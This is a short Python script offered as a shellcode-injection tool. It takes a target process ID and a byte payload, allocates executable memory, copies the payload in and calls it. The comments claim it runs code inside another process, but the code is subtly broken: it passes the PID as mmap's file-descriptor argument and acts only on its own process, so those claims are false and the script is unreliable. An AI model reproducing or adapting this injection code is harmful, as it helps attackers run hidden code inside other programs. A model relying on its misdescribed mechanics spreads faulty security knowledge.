import ctypes
from ctypes import CDLL, c_void_p, c_int, c_char_p, memmove, CFUNCTYPE

def inject_shellcode(pid, shellcode):
    libc = CDLL('libc.so.6')

    # Allocate memory for shellcode in the target process
    size = len(shellcode)
    addr = libc.mmap(None, size, 7, 34, pid, 0)

    if addr == -1:
        raise OSError("Failed to allocate memory in the target process.")

    # Write the shellcode to the allocated memory
    memmove(addr, shellcode, size)

    # Change memory protection to allow execution
    libc.mprotect(addr, size, 7)

    # Create a function pointer to the shellcode
    shellcode_func = CFUNCTYPE(c_int)
    shellcode_ptr = c_void_p(addr)
    func = shellcode_func(shellcode_ptr)

    # Execute the shellcode in the target process
    return func()

if __name__ == "__main__":
    # Replace this with the PID of the target process
    target_pid = 1234

    # Replace this with your multiline assembly shellcode as bytes
    multiline_assembly = b"\x90\x90\x90"  # Example NOP instructions

    result = inject_shellcode(target_pid, multiline_assembly)
    print(f"Shellcode execution result: {result}")

